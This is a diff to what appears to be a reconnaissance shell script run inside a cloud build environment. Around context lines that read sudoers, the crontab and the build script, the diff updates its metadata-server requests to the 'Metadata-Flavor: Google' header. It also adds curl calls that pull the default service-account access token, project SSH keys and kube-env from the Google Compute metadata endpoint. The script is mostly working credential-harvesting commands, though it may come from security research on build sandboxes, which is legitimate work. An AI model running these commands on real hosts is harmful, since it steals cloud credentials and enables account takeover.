@@ -21,15 +21,18 @@ ls /etc/sudoers.d/
 cat /etc/crontab
 cat /root/.start-build.sh
 
-curl  -H "X-Google-Metadata-Request: True" -vv http://169.254.169.254/computeMetadata/v1/
-curl -H "X-Google-Metadata-Request: True" -vv http://metadata.google.internal/computeMetadata/v1/
-curl  -H "X-Google-Metadata-Request: True" -vv http://metadata/computeMetadata/v1/
-curl  -H "X-Google-Metadata-Request: True" -vv http://metadata.google.internal/computeMetadata/v1/instance/hostname
-curl  -H "X-Google-Metadata-Request: True" -vv http://metadata.google.internal/computeMetadata/v1/instance/id
-curl  -H "X-Google-Metadata-Request: True" -vv http://metadata.google.internal/computeMetadata/v1/project/project-id
-curl  -H "X-Google-Metadata-Request: True" -vv http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env
-curl  -H "X-Google-Metadata-Request: True" -vv http://metadata.google.internal/computeMetadata/v1/instance/disks/?recursive=true
+curl  -H "Metadata-Flavor: Google" -vv http://169.254.169.254/computeMetadata/v1/
+curl -H "Metadata-Flavor: Google" -vv http://metadata.google.internal/computeMetadata/v1/
+curl  -H "Metadata-Flavor: Google" -vv http://metadata/computeMetadata/v1/
+curl  -H "Metadata-Flavor: Google" -vv http://metadata.google.internal/computeMetadata/v1/instance/hostname
+curl  -H "Metadata-Flavor: Google" -vv http://metadata.google.internal/computeMetadata/v1/instance/id
+curl  -H "Metadata-Flavor: Google" -vv http://metadata.google.internal/computeMetadata/v1/project/project-id
+curl  -H "Metadata-Flavor: Google" -vv http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env
+curl  -H "Metadata-Flavor: Google" -vv http://metadata.google.internal/computeMetadata/v1/instance/disks/?recursive=true
 curl -vv http://metadata.google.internal/computeMetadata/v1beta1/instance/attributes/?recursive=true&alt=json
+curl -vv http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token
+curl -vv http://metadata.google.internal/computeMetadata/v1beta1/project/attributes/ssh-keys?alt=json
+curl -vv  http://metadata.google.internal/computeMetadata/v1beta1/instance/attributes/kube-env?alt=json
 
 
 
